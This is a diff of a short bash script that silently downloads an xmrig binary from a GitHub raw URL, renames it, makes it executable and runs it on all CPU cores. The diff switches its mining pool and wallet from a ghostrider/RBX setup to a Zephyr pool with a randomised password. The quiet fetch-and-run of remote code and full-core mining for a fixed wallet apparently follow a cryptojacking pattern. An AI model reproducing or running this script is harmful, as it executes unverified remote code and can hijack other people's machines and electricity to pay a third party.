@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O sgr1 https://raw.githubusercontent.com/6248202226/filesg/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 -a ghostrider --url stratum-eu.rplant.xyz:7054 --user RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.x --pass webpassword=x -t $(nproc --all)
+./sgr1 --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -a rx/0 -k -t $(nproc --all) 
